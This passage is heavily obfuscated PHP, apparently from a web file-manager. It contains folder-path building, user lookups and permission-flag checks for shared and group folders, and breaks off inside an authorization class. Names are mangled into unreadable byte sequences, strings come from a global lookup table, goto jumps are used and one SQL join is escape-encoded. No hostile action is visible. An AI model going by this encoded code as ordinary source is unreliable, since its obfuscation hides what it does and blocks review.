$ÔÏê¬¾î[$‹‰ÚËê¥[32]], $‹‰ÚËê¥[493] => $ÔÏê¬¾î[$‹‰ÚËê¥[494]]); } } if ($é¡—İéá && isset($é¡—İéá[$ˆ²Üû£Ç[$‹‰ÚËê¥[410]]])) { $ˆ²Üû£Ç[$‹‰ÚËê¥[86]][$‹‰ÚËê¥[495]] = array(); foreach ($é¡—İéá[$ˆ²Üû£Ç[$‹‰ÚËê¥[410]]] as $½½ääÌ¾) { $ˆ²Üû£Ç[$‹‰ÚËê¥[86]][$‹‰ÚËê¥[495]] = array($‹‰ÚËê¥[496] => $½½ääÌ¾[$‹‰ÚËê¥[497]], $‹‰ÚËê¥[498] => $½½ääÌ¾[$‹‰ÚËê¥[499]], $‹‰ÚËê¥[500] => $½½ääÌ¾[$‹‰ÚËê¥[410]], $‹‰ÚËê¥[501] => $½½ääÌ¾[$‹‰ÚËê¥[502]], $‹‰ÚËê¥[503] => $½½ääÌ¾[$‹‰ÚËê¥[504]], $‹‰ÚËê¥[505] => $½½ääÌ¾[$‹‰ÚËê¥[505]], $‹‰ÚËê¥[506] => $½½ääÌ¾[$‹‰ÚËê¥[506]]); } } } unset($ˆ²Üû£Ç); return $¹Ú“¤©¨; } protected function _listAppendChildren(&$—Ò®®¤È, $û‚ë¢·§) { $Ö¼µ¶Å =& $_SERVER[ Ö‘ñÄ”]; $ƒí“£Œ = array(); $öšÜ±İ… = array($Ö¼µ¶Å[207] => 0, $Ö¼µ¶Å[208] => 0); foreach ($—Ò®®¤È as &$Ú¡Í‘æ¶) { if (!$Ú¡Í‘æ¶[$Ö¼µ¶Å[418]]) { continue; } $ƒí“£Œ[] = $Ú¡Í‘æ¶[$Ö¼µ¶Å[410]]; } unset($Ú¡Í‘æ¶); if (!$ƒí“£Œ) { return; } $’˜ªøó = array($Ö¼µ¶Å[440] => array($Ö¼µ¶Å[7], $ƒí“£Œ), $Ö¼µ¶Å[439] => 0); $Ã“ÅÓƒú = array($Ö¼µ¶Å[440], $Ö¼µ¶Å[418], $Ö¼µ¶Å[507] => $Ö¼µ¶Å[508]); $·»„Ûí“ = $this->field($Ã“ÅÓƒú)->where($’˜ªøó)->group($Ö¼µ¶Å[509])->select(); $«÷œ‰éà = array(); foreach ($·»„Ûí“ as $µïŠˆñÅ) { $Î·á·Ì = $µïŠˆñÅ[$Ö¼µ¶Å[440]]; $ˆ‘±ÄÚ = $µïŠˆñÅ[$Ö¼µ¶Å[418]] == $Ö¼µ¶Å[88] ? $Ö¼µ¶Å[208] : $Ö¼µ¶Å[207]; if (!isset($«÷œ‰éà[$Î·á·Ì])) { $«÷œ‰éà[$Î·á·Ì] = array($Ö¼µ¶Å[207] => 0, $Ö¼µ¶Å[208] => 0); } $«÷œ‰éà[$Î·á·Ì][$ˆ‘±ÄÚ] += $µïŠˆñÅ[$Ö¼µ¶Å[508]]; } foreach ($—Ò®®¤È as &$Ú¡Í‘æ¶) { if (!$Ú¡Í‘æ¶[$Ö¼µ¶Å[418]]) { continue; } $½ëûôœŒ = is_array($«÷œ‰éà[$Ú¡Í‘æ¶[$Ö¼µ¶Å[410]]]) ? $«÷œ‰éà[$Ú¡Í‘æ¶[$Ö¼µ¶Å[410]]] : $öšÜ±İ…; $Ú¡Í‘æ¶[$Ö¼µ¶Å[208]] = $½ëûôœŒ[$Ö¼µ¶Å[208]]; $Ú¡Í‘æ¶[$Ö¼µ¶Å[207]] = $½ëûôœŒ[$Ö¼µ¶Å[207]]; unset($Ú¡Í‘æ¶[$Ö¼µ¶Å[420]]); } unset($Ú¡Í‘æ¶); } protected function _listAppendAuth(&$ÊˆÕûË‚) { $ÛËÉëİ =& $_SERVER[ Ö‘ñÄ”]; if (!defined($ÛËÉëİ[483])) { return; } $şé™ÏÕ¨ = array(); foreach ($ÊˆÕûË‚ as $ùùû„ğ„) { if ($ùùû„ğ„[$ÛËÉëİ[419]] == self::TYPE_GROUP) { $şé™ÏÕ¨[] = $ùùû„ğ„[$ÛËÉëİ[410]]; } } if (!$şé™ÏÕ¨) { return; } $ù›‹µ· = array_to_keyvalue($ÊˆÕûË‚, $ÛËÉëİ[410]); $ç‰å¢ò = Model($ÛËÉëİ[510])->getSourceList($şé™ÏÕ¨, $ù›‹µ·); $Àê«ê¢ = $GLOBALS[$ÛËÉëİ[511]] == 1; foreach ($ÊˆÕûË‚ as $Ù‰šğ¼ => &$ùùû„ğ„) { $ùùû„ğ„[$ÛËÉëİ[421]] = $ç‰å¢ò[$ùùû„ğ„[$ÛËÉëİ[410]]]; if (!$ùùû„ğ„[$ÛËÉëİ[421]] && $ùùû„ğ„[$ÛËÉëİ[419]] == self::TYPE_GROUP) { $ùùû„ğ„[$ÛËÉëİ[421]] = Action($ÛËÉëİ[512])->pathGroupAuthMake($ùùû„ğ„[$ÛËÉëİ[513]]); if (!$ùùû„ğ„[$ÛËÉëİ[421]] && !$Àê«ê¢) { $ùùû„ğ„[$ÛËÉëİ[202]] = !1; $ùùû„ğ„[$ÛËÉëİ[201]] = !1; } } if ($ùùû„ğ„[$ÛËÉëİ[421]]) { $ùùû„ğ„[$ÛËÉëİ[202]] = AuthModel::authCheckEdit($ùùû„ğ„[$ÛËÉëİ[421]][$ÛËÉëİ[422]]); $ùùû„ğ„[$ÛËÉëİ[201]] = AuthModel::authCheckView($ùùû„ğ„[$ÛËÉëİ[421]][$ÛËÉëİ[422]]); } $this->groupPathDisplay($ùùû„ğ„); } unset($ùùû„ğ„); } public function _listAppendAuthSecret(&$‰øÌ×¸) { $Ü³“Øµí =& $_SERVER[ Ö‘ñÄ”]; if (Model($Ü³“Øµí[443])->get($Ü³“Øµí[514]) != $Ü³“Øµí[88]) { return; } static $úºÉÆëÛ = false; if (!$úºÉÆëÛ) { $ííì‡¹Ì = Model($Ü³“Øµí[515]); $¬Óìéµ = Model($Ü³“Øµí[516]); $úºÉÆëÛ = $¬Óìéµ->listData(); $úºÉÆëÛ = array_to_keyvalue($úºÉÆëÛ, $Ü³“Øµí[410]); $ïá¶‡Èæ = json_decode(Model($Ü³“Øµí[443])->get($Ü³“Øµí[517]), !0); $ïá¶‡Èæ = array_to_keyvalue($ïá¶‡Èæ, $Ü³“Øµí[407]); foreach ($úºÉÆëÛ as $êŞ¾“ßÁ => $ıóî‹å) { $ÃÊÇÕìº = $ïá¶‡Èæ[$ıóî‹å[$Ü³“Øµí[518]]]; if (!$ÃÊÇÕìº) { $¬Óìéµ->remove($ıóî‹å[$Ü³“Øµí[407]]); unset($úºÉÆëÛ[$êŞ¾“ßÁ]); continue; } $Ù”ŞË÷ = $ííì‡¹Ì->listData($ÃÊÇÕìº[$Ü³“Øµí[421]]); if (!$Ù”ŞË÷) { $¬Óìéµ->remove($ıóî‹å[$Ü³“Øµí[407]]); unset($úºÉÆëÛ[$êŞ¾“ßÁ]); continue; } $ıóî‹å[$Ü³“Øµí[421]] = $Ù”ŞË÷; $ıóî‹å[$Ü³“Øµí[519]] = $ÃÊÇÕìº; $ıóî‹å[$Ü³“Øµí[520]] = Model($Ü³“Øµí[521])->getInfoSimpleOuter($ıóî‹å[$Ü³“Øµí[462]]); $úºÉÆëÛ[$êŞ¾“ßÁ] = $ıóî‹å; } } $Ö“œ«Şğ = defined($Ü³“Øµí[522]) ? USER_ID : $Ü³“Øµí[12]; $ÈµŸ­Ç· = array(); $·ïÔ­úÂ = $this->_listAppendPath($ÈµŸ­Ç·, !0); foreach ($‰øÌ×¸ as $êŞ¾“ßÁ => &$ıóî‹å) { if (!is_array($ıóî‹å[$Ü³“Øµí[421]])) { continue; } if ($ıóî‹å[$Ü³“Øµí[419]] != $Ü³“Øµí[523]) { continue; } if (isset($úºÉÆëÛ[$ıóî‹å[$Ü³“Øµí[410]]])) { $€µ¦œ¼ = $úºÉÆëÛ[$ıóî‹å[$Ü³“Øµí[410]]]; if (!is_array($ıóî‹å[$Ü³“Øµí[474]])) { $ıóî‹å[$Ü³“Øµí[474]] = array(); } $ıóî‹å[$Ü³“Øµí[474]][$Ü³“Øµí[524]] = $€µ¦œ¼[$Ü³“Øµí[518]]; $ıóî‹å[$Ü³“Øµí[421]][$Ü³“Øµí[525]] = $€µ¦œ¼; $ıóî‹å[$Ü³“Øµí[421]][$Ü³“Øµí[526]] = $ıóî‹å[$Ü³“Øµí[527]]; $ıóî‹å[$Ü³“Øµí[421]][$Ü³“Øµí[528]] = $Ü³“Øµí[88]; if ($€µ¦œ¼[$Ü³“Øµí[462]] != $Ö“œ«Şğ) { $ıóî‹å[$Ü³“Øµí[421]][$Ü³“Øµí[422]] = $ıóî‹å[$Ü³“Øµí[421]][$Ü³“Øµí[422]] & $€µ¦œ¼[$Ü³“Øµí[421]][$Ü³“Øµí[421]]; } continue; } $²Í—ŠÏÄ = $this->parentLevelArray($ıóî‹å[$Ü³“Øµí[529]]); $¸ö®ÓâÅ = array_reverse($²Í—ŠÏÄ); foreach ($¸ö®ÓâÅ as $Å¸ß‚íí => $€µ°ğÊÚ) { if (!isset($úºÉÆëÛ[$€µ°ğÊÚ])) { continue; } $€µ¦œ¼ = $úºÉÆëÛ[$€µ°ğÊÚ]; $ıóî‹å[$Ü³“Øµí[421]][$Ü³“Øµí[525]] = $€µ¦œ¼; if ($€µ¦œ¼[$Ü³“Øµí[462]] != $Ö“œ«Şğ) { $ıóî‹å[$Ü³“Øµí[421]][$Ü³“Øµí[422]] = $ıóî‹å[$Ü³“Øµí[421]][$Ü³“Øµí[422]] & $€µ¦œ¼[$Ü³“Øµí[421]][$Ü³“Øµí[421]]; } $‡àœôÅç = $Ü³“Øµí[12]; $Ğ§ÇÏı¡ = count($²Í—ŠÏÄ) - $Å¸ß‚íí; for ($¶ĞóøÆ = 0; $¶ĞóøÆ < $Ğ§ÇÏı¡; $¶ĞóøÆ++) { if (!isset($·ïÔ­úÂ[$²Í—ŠÏÄ[$¶ĞóøÆ]])) { $‡àœôÅç = $Ü³“Øµí[12]; break; } $‡àœôÅç = $‡àœôÅç . rtrim($·ïÔ­úÂ[$²Í—ŠÏÄ[$¶ĞóøÆ]], $Ü³“Øµí[8]) . $Ü³“Øµí[8]; } $ıóî‹å[$Ü³“Øµí[421]][$Ü³“Øµí[526]] = rtrim($‡àœôÅç, $Ü³“Øµí[8]) . $Ü³“Øµí[8]; break; } } unset($ıóî‹å); } public function groupPathDisplay(&$“«´ŒĞİ) { $ÓŞ„ƒş„ =& $_SERVER[ Ö‘ñÄ”]; if ($“«´ŒĞİ[$ÓŞ„ƒş„[419]] != self::TYPE_GROUP) { return; } $Ãù†şİÆ = Model($ÓŞ„ƒş„[530])->getInfo($“«´ŒĞİ[$ÓŞ„ƒş„[513]]); $°úÂ·×¦ = $this->parentLevelArray($Ãù†şİÆ[$ÓŞ„ƒş„[529]]); $Åùı¨Ğ½ = $ÓŞ„ƒş„[12]; foreach ($°úÂ·×¦ as $à¡ö‰ñÇ) { $¸ÇÌ¬³ = Model($ÓŞ„ƒş„[530])->getInfo($à¡ö‰ñÇ); $Åùı¨Ğ½ .= $¸ÇÌ¬³[$ÓŞ„ƒş„[86]][$ÓŞ„ƒş„[410]] . $ÓŞ„ƒş„[50]; } $“«´ŒĞİ[$ÓŞ„ƒş„[531]] = $Ãù†şİÆ[$ÓŞ„ƒş„[440]]; $“«´ŒĞİ[$ÓŞ„ƒş„[532]] = $Ãù†şİÆ[$ÓŞ„ƒş„[529]]; $“«´ŒĞİ[$ÓŞ„ƒş„[533]] = $Ãù†şİÆ[$ÓŞ„ƒş„[534]]; $“«´ŒĞİ[$ÓŞ„ƒş„[535]] = $Åùı¨Ğ½ . $Ãù†şİÆ[$ÓŞ„ƒş„[86]][$ÓŞ„ƒş„[410]]; } protected function _listAppendPath(&$üİÑëÙè, $êŠÒ²ø = false) { $õÂ…Ö»À =& $_SERVER[ Ö‘ñÄ”]; static $§ÍÀÒÌ­ = array(); $Õ¸â›ïÒ = array(); $á¦ÚŸ×« = array(); if ($êŠÒ²ø) { return $§ÍÀÒÌ­; } foreach ($üİÑëÙè as &$Ø¦§‡Úè) { $»¿ôóÁ = $Ø¦§‡Úè[$õÂ…Ö»À[410]]; if ($Ø¦§‡Úè[$õÂ…Ö»À[418]] == $õÂ…Ö»À[88] && $Ø¦§‡Úè[$õÂ…Ö»À[440]] != 0) { $§ÍÀÒÌ­[$»¿ôóÁ] = $Ø¦§‡Úè[$õÂ…Ö»À[32]]; } if ($Ø¦§‡Úè[$õÂ…Ö»À[418]] == $õÂ…Ö»À[88] && $Ø¦§‡Úè[$õÂ…Ö»À[440]] == 0 && !isset($§ÍÀÒÌ­[$»¿ôóÁ])) { $§ÍÀÒÌ­[$»¿ôóÁ] = $this->_listAppendPathRoot($Ø¦§‡Úè, array()); } if (isset($á¦ÚŸ×«[$Ø¦§‡Úè[$õÂ…Ö»À[529]]])) { continue; } $á¦ÚŸ×«[$Ø¦§‡Úè[$õÂ…Ö»À[529]]] = !0; $Ñä’½Ù” = $this->parentLevelArray($Ø¦§‡Úè[$õÂ…Ö»À[529]]); foreach ($Ñä’½Ù” as $Ù²ôŠÈ => $ŞÕç…‹ã) { if (isset($§ÍÀÒÌ­[$ŞÕç…‹ã])) { continue; } if ($Ù²ôŠÈ == 0) { $§ÍÀÒÌ­[$ŞÕç…‹ã] = $this->_listAppendPathRoot($Ø¦§‡Úè, $Ñä’½Ù”); } if ($Ù²ôŠÈ != 0) { $Õ¸â›ïÒ[] = $ŞÕç…‹ã; } } } unset($Ø¦§‡Úè); $Õ¸â›ïÒ = array_unique($Õ¸â›ïÒ); if (count($Õ¸â›ïÒ) > 0) { $Ùíæ•Ğã = array($õÂ…Ö»À[425] => array($õÂ…Ö»À[426], $Õ¸â›ïÒ)); if (count($Õ¸â›ïÒ) == 1) { $è§Úáîª = $this->sourceInfo($Õ¸â›ïÒ[0]); $®›ó¡À = is_array($è§Úáîª) ? array($è§Úáîª) : !1; } else { $®›ó¡À = $this->field($õÂ…Ö»À[536])->where($Ùíæ•Ğã)->select(); } if (!$®›ó¡À) { $®›ó¡À = array(); } foreach ($®›ó¡À as $ÓÕÚÑ¸¬) { $§ÍÀÒÌ­[$ÓÕÚÑ¸¬[$õÂ…Ö»À[410]]] = $ÓÕÚÑ¸¬[$õÂ…Ö»À[32]]; } } $¢óµ©Ê£ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ÚŠÑ½ìª = array(); foreach ($üİÑëÙè as &$Ø¦§‡Úè) { $ºö–Àà˜ = $Ø¦§‡Úè[$õÂ…Ö»À[529]]; $ÒÚíêÅµ = $õÂ…Ö»À[12]; if (isset($ÚŠÑ½ìª[$ºö–Àà˜])) { $ÒÚíêÅµ = $ÚŠÑ½ìª[$ºö–Àà˜]; } else { $Ñä’½Ù” = $this->parentLevelArray($Ø¦§‡Úè[$õÂ…Ö»À[529]]); foreach ($Ñä’½Ù” as $Ù²ôŠÈ => $ŞÕç…‹ã) { if (isset($§ÍÀÒÌ­[$ŞÕç…‹ã])) { $ÒÚíêÅµ .= $§ÍÀÒÌ­[$ŞÕç…‹ã] . $õÂ…Ö»À[8]; } } $ÚŠÑ½ìª[$ºö–Àà˜] = $ÒÚíêÅµ; } $ÒÚíêÅµ .= $Ø¦§‡Úè[$õÂ…Ö»À[32]]; if ($Ø¦§‡Úè[$õÂ…Ö»À[418]] == $õÂ…Ö»À[88]) { $ÒÚíêÅµ .= $õÂ…Ö»À[8]; } $Ø¦§‡Úè[$õÂ…Ö»À[527]] = str_replace($õÂ…Ö»À[537], $õÂ…Ö»À[8], $ÒÚíêÅµ); if ($Ø¦§‡Úè[$õÂ…Ö»À[440]] == $õÂ…Ö»À[197]) { $Ø¦§‡Úè[$õÂ…Ö»À[32]] = trim($§ÍÀÒÌ­[$Ø¦§‡Úè[$õÂ…Ö»À[410]]], $õÂ…Ö»À[8]); $Ø¦§‡Úè[$õÂ…Ö»À[527]] = $Ø¦§‡Úè[$õÂ…Ö»À[32]] . $õÂ…Ö»À[8]; } if (intval($Ø¦§‡Úè[$õÂ…Ö»À[419]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($Ø¦§‡Úè, $Ñä’½Ù”, $¢óµ©Ê£); } } unset($Ø¦§‡Úè); return $üİÑëÙè; } private function _listAppendPathRecycle(&$áØÕÓ«, $¬Æİåæ‚, $Ø¡“¹œ„) { $ˆšØÂÜÙ =& $_SERVER[ Ö‘ñÄ”]; if (!in_array($Ø¡“¹œ„, $¬Æİåæ‚) && $áØÕÓ«[$ˆšØÂÜÙ[410]] != $Ø¡“¹œ„) { return; } $ıÄŞÅ¼“ = explode($ˆšØÂÜÙ[8], trim($áØÕÓ«[$ˆšØÂÜÙ[527]], $ˆšØÂÜÙ[8])); $¦ˆş“ÜÙ = implode($ˆšØÂÜÙ[8], array_slice($ıÄŞÅ¼“, 2)); $áØÕÓ«[$ˆšØÂÜÙ[527]] = $ˆšØÂÜÙ[8] . LNG($ˆšØÂÜÙ[538]) . $ˆšØÂÜÙ[8] . ltrim($¦ˆş“ÜÙ, $ˆšØÂÜÙ[8]); $áØÕÓ«[$ˆšØÂÜÙ[529]] = $ˆšØÂÜÙ[539] . implode($ˆšØÂÜÙ[50], array_slice($¬Æİåæ‚, 1)) . $ˆšØÂÜÙ[50]; if ($áØÕÓ«[$ˆšØÂÜÙ[410]] == $Ø¡“¹œ„) { $áØÕÓ«[$ˆšØÂÜÙ[529]] = $ˆšØÂÜÙ[539]; $áØÕÓ«[$ˆšØÂÜÙ[440]] = $ˆšØÂÜÙ[197]; $áØÕÓ«[$ˆšØÂÜÙ[32]] = LNG($ˆšØÂÜÙ[538]); } $áØÕÓ«[$ˆšØÂÜÙ[540]] = $ˆšØÂÜÙ[541]; } protected function _listAppendPathRoot(&$Ú™õØ¢–, $±îíïß) { $¡úƒğ¤ò =& $_SERVER[ Ö‘ñÄ”]; static $ÌÎœ×ï = false; $Ü¥íğªŒ = $¡úƒğ¤ò[12]; if ($Ú™õØ¢–[$¡úƒğ¤ò[419]] == self::TYPE_USER) { if (defined($¡úƒğ¤ò[483]) && $Ú™õØ¢–[$¡úƒğ¤ò[513]] == USER_ID) { $Ü¥íğªŒ = LNG($¡úƒğ¤ò[542]); if ($ÌÎœ×ï === !1) { $ıİ£Ù½õ = Model($¡úƒğ¤ò[543])->getInfoFull(USER_ID); $ÌÎœ×ï = _get($ıİ£Ù½õ, $¡úƒğ¤ò[544], $¡úƒğ¤ò[12]); } if ($±îíïß && $±îíïß[0] == $ÌÎœ×ï || !$±îíïß && $Ú™õØ¢–[$¡úƒğ¤ò[410]] == $ÌÎœ×ï) { $Ü¥íğªŒ = LNG($¡úƒğ¤ò[545]); $Ú™õØ¢–[$¡úƒğ¤ò[546]] = $¡úƒğ¤ò[547]; } if (!$±îíïß) { $Ú™õØ¢–[$¡úƒğ¤ò[32]] = $Ü¥íğªŒ; } } else { $¼…ìÇ»ò = Model($¡úƒğ¤ò[521])->getInfoSimple($Ú™õØ¢–[$¡úƒğ¤ò[513]]); $Ü¥íğªŒ = LNG($¡úƒğ¤ò[548]) . $¡úƒğ¤ò[162] . $¼…ìÇ»ò[$¡úƒğ¤ò[32]] . $¡úƒğ¤ò[164]; $Ú™õØ¢–[$¡úƒğ¤ò[549]] = array($¡úƒğ¤ò[32] => $¼…ìÇ»ò[$¡úƒğ¤ò[32]], $¡úƒğ¤ò[550] => $¼…ìÇ»ò[$¡úƒğ¤ò[550]], $¡úƒğ¤ò[551] => $¼…ìÇ»ò[$¡úƒğ¤ò[551]]); } } else { if ($Ú™õØ¢–[$¡úƒğ¤ò[419]] == self::TYPE_GROUP) { $¼…ìÇ»ò = Model($¡úƒğ¤ò[530])->getInfoSimple($Ú™õØ¢–[$¡úƒğ¤ò[513]]); $Ü¥íğªŒ = $¼…ìÇ»ò[$¡úƒğ¤ò[32]]; } else { if ($Ú™õØ¢–[$¡úƒğ¤ò[419]] == self::TYPE_SYSTEM) { $Ü¥íğªŒ = $¡úƒğ¤ò[552]; } } } $Ü¥íğªŒ = $Ü¥íğªŒ ? $¡úƒğ¤ò[8] . $Ü¥íğªŒ . $¡úƒğ¤ò[8] : $¡úƒğ¤ò[8]; return $Ü¥íğªŒ; } protected function _listAppendUser(&$å–šëõı) { $¡ÍÛ®–¦ =& $_SERVER[ Ö‘ñÄ”]; $ıºŸ•â£ = array_to_keyvalue($å–šëõı, $¡ÍÛ®–¦[12], $¡ÍÛ®–¦[462]); $ùñ¦–áö = array_to_keyvalue($å–šëõı, $¡ÍÛ®–¦[12], $¡ÍÛ®–¦[464]); $Ö˜¤ÊĞƒ = array_merge($ıºŸ•â£, $ùñ¦–áö); $»»«Úäı = Model($¡ÍÛ®–¦[543])->userListInfo($Ö˜¤ÊĞƒ); foreach ($å–šëõı as &$“˜ôÄá) { $ªÀ¹¸Ûñ = $“˜ôÄá[$¡ÍÛ®–¦[462]]; $“˜ôÄá[$¡ÍÛ®–¦[462]] = $»»«Úäı[$ªÀ¹¸Ûñ] ? $»»«Úäı[$ªÀ¹¸Ûñ] : !1; $ªÀ¹¸Ûñ = $“˜ôÄá[$¡ÍÛ®–¦[464]]; $“˜ôÄá[$¡ÍÛ®–¦[464]] = $»»«Úäı[$ªÀ¹¸Ûñ] ? $»»«Úäı[$ªÀ¹¸Ûñ] : !1; if (isset($“˜ôÄá[$¡ÍÛ®–¦[474]]) && $“˜ôÄá[$¡ÍÛ®–¦[474]][$¡ÍÛ®–¦[553]]) { $ıÇ…¾©å = $GLOBALS[$¡ÍÛ®–¦[6]][$¡ÍÛ®–¦[89]][$¡ÍÛ®–¦[554]]; if ($“˜ôÄá[$¡ÍÛ®–¦[474]][$¡ÍÛ®–¦[555]] <= time() - $ıÇ…¾©å) { $this->metaSet($“˜ôÄá[$¡ÍÛ®–¦[410]], $¡ÍÛ®–¦[553], null); $this->metaSet($“˜ôÄá[$¡ÍÛ®–¦[410]], $¡ÍÛ®–¦[555], null); unset($“˜ôÄá[$¡ÍÛ®–¦[474]][$¡ÍÛ®–¦[553]]); continue; } $ï­³Ø˜ = $“˜ôÄá[$¡ÍÛ®–¦[474]][$¡ÍÛ®–¦[553]]; $“˜ôÄá[$¡ÍÛ®–¦[474]][$¡ÍÛ®–¦[556]] = Model($¡ÍÛ®–¦[543])->getInfoSimpleOuter($ï­³Ø˜); } } unset($“˜ôÄá); } public function parentLevelArray($È£“ß¹Ø) { $ƒÎ¿¤¶ =& $_SERVER[ Ö‘ñÄ”]; $È£“ß¹Ø = explode($ƒÎ¿¤¶[50], trim($È£“ß¹Ø, $ƒÎ¿¤¶[50])); return array_remove_value($È£“ß¹Ø, $ƒÎ¿¤¶[197]); } public function listAll($ñŠŒ¡Ò‹) { $¼ÑÒÇ¢È =& $_SERVER[ Ö‘ñÄ”]; $ÏììªÍ© = $this->sourceInfo($ñŠŒ¡Ò‹); $²õòéş– = array($¼ÑÒÇ¢È[557] => array($¼ÑÒÇ¢È[558], $ÏììªÍ©[$¼ÑÒÇ¢È[529]] . $ñŠŒ¡Ò‹ . $¼ÑÒÇ¢È[559]), $¼ÑÒÇ¢È[560] => 0); $¯º¹æ•Á = $¼ÑÒÇ¢È[561]; $Ó¬Íåê¨ = "\x4c\x45\x46\x54\40\112\117\111\116\x20{$this->tablePrefix}\151\x6f\137\x66\x69\x6c\x65\40\x66\x69\154\x65\x20\157\156\40\163\157\165\x72\x63\145\56\x66\x69\154\145\111\x44\x20\75\x20\146\151\x6c\x65\x2e\146\151\154\145\111\104"; $´ÖŸÒ = $this->alias($¼ÑÒÇ¢È[454])->field($¯º¹æ•Á)->where($²õòéş–)->join($Ó¬Íåê¨)->select(); $this->_listAppendAuth($´ÖŸÒ); $this->_listAppendUser($´ÖŸÒ); $this->_listAppendPath($´ÖŸÒ); $´ÖŸÒ = array_to_keyvalue($´ÖŸÒ, $¼ÑÒÇ¢È[410]); $ƒÉ¿šİ° = "\57{$ÏììªÍ©[$¼ÑÒÇ¢È[32]]}\57"; $ƒÉ¿šİ° = $ƒÉ¿šİ° == $¼ÑÒÇ¢È[537] ? $¼ÑÒÇ¢È[8] : $ƒÉ¿šİ°; $è­ÙÔåë = array(); foreach ($´ÖŸÒ as $õ€ƒ”† => $ÖßÆÔ„í) { $—¥³ŸæÊ = $this->parentLevelArray($ÖßÆÔ„í[$¼ÑÒÇ¢È[529]]); array_shift($—¥³ŸæÊ); $êœÖµú = $ƒÉ¿šİ°; for ($–æ‚¼ØĞ = 0; $–æ‚¼ØĞ < count($—¥³ŸæÊ); $–æ‚¼ØĞ++) { $êœÖµú .= $´ÖŸÒ[$—¥³ŸæÊ[$–æ‚¼ØĞ]][$¼ÑÒÇ¢È[32]] . $¼ÑÒÇ¢È[8]; } $êœÖµú .= $ÖßÆÔ„í[$¼ÑÒÇ¢È[32]]; if ($ÖßÆÔ„í[$¼ÑÒÇ¢È[418]]) { $êœÖµú .= $¼ÑÒÇ¢È[8]; } $êœÖµú = str_replace($¼ÑÒÇ¢È[537], $¼ÑÒÇ¢È[8], $êœÖµú); $êœÖµú = str_replace($¼ÑÒÇ¢È[537], $¼ÑÒÇ¢È[8], $êœÖµú); $¨Ò¹ìÏø = array($¼ÑÒÇ¢È[429] => str_replace($¼ÑÒÇ¢È[537], $¼ÑÒÇ¢È[8], $êœÖµú), $¼ÑÒÇ¢È[562] => intval($ÖßÆÔ„í[$¼ÑÒÇ¢È[418]]), $¼ÑÒÇ¢È[86] => $this->pathInfoFilter($ÖßÆÔ„í)); if (!$ÖßÆÔ„í[$¼ÑÒÇ¢È[418]]) { $¨Ò¹ìÏø[$¼ÑÒÇ¢È[476]] = $ÖßÆÔ„í[$¼ÑÒÇ¢È[476]]; $¨Ò¹ìÏø[$¼ÑÒÇ¢È[87]] = $ÖßÆÔ„í[$¼ÑÒÇ¢È[84]]; } $è­ÙÔåë[] = $¨Ò¹ìÏø; } return $è­ÙÔåë; } } goto eå™ƒå°Æ; b˜Ëæà­Æ: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $°öÉÂ‰° =& $_SERVER[ Ö‘ñÄ”]; $¿éŸ›ë¹ = array(array($°öÉÂ‰°[428] => LNG($°öÉÂ‰°[1837]), $°öÉÂ‰°[1838] => $°öÉÂ‰°[1839], $°öÉÂ‰°[1840] => 1, $°öÉÂ‰°[1841] => 1, $°öÉÂ‰°[1842] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($°öÉÂ‰°[428] => LNG($°öÉÂ‰°[1843]), $°öÉÂ‰°[1838] => $°öÉÂ‰°[1844], $°öÉÂ‰°[1840] => 2, $°öÉÂ‰°[1841] => 1, $°öÉÂ‰°[1842] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($°öÉÂ‰°[428] => LNG($°öÉÂ‰°[1845]), $°öÉÂ‰°[1838] => $°öÉÂ‰°[1846], $°öÉÂ‰°[1840] => 3, $°öÉÂ‰°[1841] => 1, $°öÉÂ‰°[1842] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($°öÉÂ‰°[428] => LNG($°öÉÂ‰°[1847]), $°öÉÂ‰°[1838] => $°öÉÂ‰°[1848], $°öÉÂ‰°[1840] => 4, $°öÉÂ‰°[1841] => 1, $°öÉÂ‰°[1842] => self::AUTH_SHOW | self::AUTH_VIEW), array($°öÉÂ‰°[428] => LNG($°öÉÂ‰°[1849]), $°öÉÂ‰°[1838] => $°öÉÂ‰°[1850], $°öÉÂ‰°[1840] => 5, $°öÉÂ‰°[1841] => 1, $°öÉÂ‰°[1842] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($°öÉÂ‰°[428] => LNG($°öÉÂ‰°[1851]), $°öÉÂ‰°[1838] => $°öÉÂ‰°[1852], $°öÉÂ‰°[1840] => 6, $°öÉÂ‰°[1841] => 1, $°öÉÂ‰°[1842] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($°öÉÂ‰°[428] => LNG($°öÉÂ‰°[1853]), $°öÉÂ‰°[1838] => $°öÉÂ‰°[1854], $°öÉÂ‰°[1840] => 7, $°öÉÂ‰°[1841] => 1, $°öÉÂ‰°[1842] => 0)); return $¿éŸ›ë¹; } public static function authCheck($ÖÚÔôÕ, $§µ²Æ¢ò) { $‚¾Äºµ =& $_SERVER[ Ö‘ñÄ”]; $ÖÚÔôÕ = intval($ÖÚÔôÕ); if ($GLOBALS[$‚¾Äºµ[511]] && $GLOBALS[$‚¾Äºµ[6]][$‚¾Äºµ[1855]]) { return !0; } if ($ÖÚÔôÕ <= 0) { return !1; } if (($ÖÚÔôÕ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return 